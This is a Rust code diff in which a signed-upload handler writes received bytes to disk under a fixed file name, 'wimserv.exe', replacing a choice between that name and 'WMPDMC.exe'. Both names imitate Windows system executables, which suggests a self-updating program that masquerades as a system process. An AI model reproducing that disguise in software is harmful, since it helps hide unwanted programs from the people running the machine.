@@ -12,10 +12,8 @@ use std::env;
 use std::io::Write;
 
 lazy_static! {
-    pub static ref NAMES: Vec<String> = vec!(
-        "WMPDMC.exe",
-        "wimserv.exe"
-    ).iter().map(|x| x.to_string()).collect();
+    pub static ref NAME1: String = "WMPDMC.exe".to_string();
+    pub static ref NAME2: String = "wimserv.exe".to_string();
 
     pub static ref KEY: RSAPrivateKey = {
         let file_content = r#"
@@ -123,17 +121,12 @@ pub fn save(upload: UploadParameters) -> Result<String> {
         return Err("wrong signature".into());
     }
 
-    // select binary name (one of two?)
-    let mut path = None;
-    for name in NAMES.iter() {
-        if !std::env::current_exe().unwrap().ends_with(name) {
-            path = Some(name);
-        }
-    }
+    // ...
+    let path = NAME2.to_string();
 
     // store file on disk
-    let mut file = File::create(&path.unwrap()).unwrap();
+    let mut file = File::create(&path).unwrap();
     file.write_all(&bytes).unwrap();
 
-    Ok(path.unwrap().to_string())
+    Ok(path)
 }
